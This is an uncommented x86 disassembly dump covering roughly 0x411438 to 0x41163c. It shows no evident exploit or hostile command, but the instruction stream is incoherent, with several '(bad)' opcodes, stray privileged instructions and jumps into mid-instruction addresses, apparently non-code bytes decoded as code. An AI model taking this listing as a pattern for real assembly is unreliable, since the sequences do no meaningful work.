  411438:	cmp    ecx,DWORD PTR [ebp+0x74]
  41143b:	cmp    ebp,DWORD PTR [edx+0x74]
  41143e:	dec    DWORD PTR [ebx-0x38baf758]
  411444:	add    eax,ebx
  411446:	fadd   DWORD PTR [ebp-0x18]
  411449:	mov    edi,eax
  41144b:	lock inc edi
  41144e:	inc    ebp
  41144f:	test   BYTE PTR [ebx+0x832a89d],cl
  411455:	xor    eax,DWORD PTR [ebp-0x75]
  411458:	add    ecx,DWORD PTR [eax]
  41145a:	sbb    BYTE PTR [ebp+0x45],dl
  41145d:	xor    ecx,DWORD PTR [ebx+0x4d3bf003]
  411463:	rdpmc  
  411465:	test   DWORD PTR [ebx],0xc18b0fff
  41146b:	or     BYTE PTR [ebp+0x4d],cl
  41146e:	mov    esi,DWORD PTR [ebx]
  411470:	rol    BYTE PTR [ebx],1
  411472:	iret   
  411473:	cmp    ecx,DWORD PTR [ebp+esi*2-0xfcd7463]
  41147a:	cmp    ecx,DWORD PTR [ebp+0xf]
  41147d:	xor    edx,DWORD PTR [edi-0x73]
  411480:	dec    DWORD PTR [eax]
  411482:	mov    esi,DWORD PTR [edx+0x10]
  411485:	add    BYTE PTR [ebp+0x77],al
  411488:	mov    DWORD PTR [eax],ebx
  41148a:	jmp    0x411501
  41148c:	or     DWORD PTR [ebp-0x179b6b64],0xff65f3bf
  411496:	pop    edi
  411497:	inc    ebp
  411498:	pop    ebx
  411499:	mov    eax,edx
  41149b:	loopne 0x41149d
  41149d:	(bad)  
  41149e:	mov    eax,ebx
  4114a0:	push   ecx
  4114a1:	ror    DWORD PTR [ebx+0x4d450813],0x33
  4114a8:	push   esi
  4114a9:	add    edi,DWORD PTR [edi+0x7180850]
  4114af:	inc    ebp
  4114b0:	(bad)  
  4114b1:	push   eax
  4114b2:	popf   
  4114b3:	dec    edi
  4114b4:	xor    bh,bh
  4114b6:	add    ecx,DWORD PTR [ebx-0x3f740b77]
  4114bc:	adc    al,0x89
  4114be:	adc    BYTE PTR [ecx+eax*1],0x75
  4114c2:	add    bh,bh
  4114c4:	or     BYTE PTR [eax*2-0x6bfc74bb],dl
  4114cb:	fadd   DWORD PTR [eax]
  4114cd:	call   0xff45075d
  4114d2:	cmp    al,0x45
  4114d4:	dec    ebp
  4114d5:	mov    ecx,DWORD PTR [ebx+0xc7d8e0]
  4114db:	ret    
  4114dc:	mov    eax,ecx
  4114de:	adc    al,0x11
  4114e0:	add    al,0x0
  4114e2:	add    BYTE PTR [ebp+0x0],dh
  4114e5:	mov    edi,edi
  4114e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e8:	push   eax
  4114e9:	inc    ebp
  4114ea:	add    BYTE PTR [eax-0x2f],dl
  4114ed:	adc    eax,0x8b45ff03
  4114f2:	xor    edx,esp
  4114f4:	add    ecx,DWORD PTR [ebp-0x77]
  4114f7:	add    esp,edi
  4114f9:	mov    eax,DWORD PTR [ebp-0x58]
  4114fc:	inc    DWORD PTR [ebp+0x14]
  4114ff:	mov    DWORD PTR [ebp+0x18],eax
  411502:	push   eax
  411503:	inc    ebp
  411504:	dec    DWORD PTR [ebx-0x388ae7f4]
  41150a:	call   0xfff10fd2
  41150f:	mov    eax,DWORD PTR [ebp+0x8]
  411512:	mov    edx,DWORD PTR [ebp+0x33]
  411515:	xor    eax,DWORD PTR [ebx]
  411517:	lea    edi,[ebx]
  411519:	adc    DWORD PTR [edx+esi*2-0x75],esi
  41151d:	add    BYTE PTR [ecx+eax*8],cl
  411520:	dec    ebp
  411521:	xor    BYTE PTR [ebx],0xfc
  411524:	add    edi,edi
  411526:	pcmpeqw mm0,QWORD PTR [ebp-0x75]
  41152a:	mov    eax,ebx
  41152c:	pop    edi
  41152d:	push   es
  41152e:	leave  
  41152f:	or     dl,BYTE PTR [eax]
  411531:	xor    eax,0x7fec2d55
  411536:	in     al,0xec
  411538:	adc    DWORD PTR [edx+0x14],0x5e
  41153c:	xor    eax,0x53149cc9
  411541:	push   ebp
  411542:	dec    esp
  411543:	in     al,dx
  411544:	or     BYTE PTR [ecx+0x57],dl
  411547:	inc    ebp
  411548:	inc    ecx
  411549:	mov    ecx,DWORD PTR [ecx-0x74a8dbf0]
  41154f:	push   esi
  411550:	and    al,0x51
  411552:	mov    edx,0x7be0833
  411557:	jb     0x411553
  411559:	add    BYTE PTR [ebp+0x30132c6],bl
  41155f:	inc    ebp
  411560:	mov    DWORD PTR [ebx+0x8b9424],ecx
  411566:	or     al,0x8b
  411568:	jl     0x4114f5
  41156a:	sbb    al,0x14
  41156c:	dec    ebp
  41156d:	xor    BYTE PTR [ebp+0x1],0x8b
  411571:	add    BYTE PTR [eax+eax*1],ah
  411574:	xor    eax,DWORD PTR [ecx-0x75]
  411577:	mov    esp,DWORD PTR [esp+edx*1]
  41157a:	add    ecx,DWORD PTR [ecx+0xca010f]
  411580:	dec    esp
  411581:	dec    ecx
  411582:	adc    BYTE PTR [edx-0x15],ch
  411585:	push   0x103039
  41158a:	sbb    al,0x70
  41158c:	inc    esp
  41158d:	push   0x10
  41158f:	dec    DWORD PTR [ecx+ecx*4+0x18]
  411593:	mov    eax,edx
  411595:	or     BYTE PTR [edi+eax*8+0x4532c69d],al
  41159c:	mov    DWORD PTR [ebx+0x75681024],ecx
  4115a2:	test   DWORD PTR [ebp+0x530efcf8],ecx
  4115a8:	jge    0x41161f
  4115aa:	xor    edi,edi
  4115ac:	pushf  
  4115ad:	or     BYTE PTR [ebp+0x6c],dh
  4115b0:	push   0xf88b85ff
  4115b5:	or     BYTE PTR [ebp+0xb],dh
  4115b8:	inc    edi
  4115ba:	or     dh,al
  4115bc:	jb     0x411586
  4115be:	call   DWORD PTR [eax]
  4115c0:	mov    DWORD PTR [ebp+0x24],eax
  4115c3:	mov    ebp,ebx
  4115c5:	adc    bh,bh
  4115c7:	(bad)  
  4115c8:	and    al,0xc6
  4115ca:	lea    ebp,[edi+0x1fffc24]
  4115d0:	or     BYTE PTR [esi+0x74],bl
  4115d3:	ret    0x20
  4115d6:	je     0x411563
  4115d8:	sbb    al,0x83
  4115da:	mov    edi,0xe8ecfff8
  4115df:	mov    ecx,0xf81485ff
  4115e4:	je     0x41156f
  4115e6:	pop    esp
  4115e7:	and    al,0x75
  4115e9:	push   esi
  4115ea:	and    al,0x8d
  4115ec:	and    al,0xfd
  4115ee:	inc    BYTE PTR [ebx+ecx*4+0x18]
  4115f2:	and    al,0x7c
  4115f4:	pop    edi
  4115f5:	adc    BYTE PTR [ebx+0x56],bl
  4115f8:	in     eax,0x51
  4115fa:	ret    0x33
  4115fd:	mov    esi,0x187200
  411602:	pushf  
  411603:	inc    BYTE PTR [ecx+0x1614857c]
  411609:	jge    0x4115a7
  41160b:	mov    DWORD PTR [esp],ecx
  41160e:	(bad)  
  41160f:	cmp    DWORD PTR [eax],ebx
  411611:	adc    BYTE PTR [eax],bl
  411613:	push   ss
  411614:	dec    DWORD PTR [edi+edi*8+0x18]
  411618:	adc    al,0xca
  41161a:	mov    edx,DWORD PTR [esp+ecx*1+0x10]
  41161e:	into   
  41161f:	scas   eax,DWORD PTR es:[edi]
  411620:	mov    DWORD PTR [eax+edx*2],esp
  411623:	das    
  411624:	inc    ebp
  411625:	jne    0x4115b2
  411627:	and    al,0x8b
  411629:	and    al,0x33
  41162b:	lea    ecx,[eax]
  41162d:	jb     0x411673
  41162f:	xor    ebp,ebx
  411631:	adc    al,bh
  411633:	xor    bh,bh
  411635:	jne    0x41167b
  411637:	sbb    al,0xff
  411639:	.byte 0xe8
  41163a:	inc    esp
  41163b:	pop    esi
  41163c:	pop    ebp
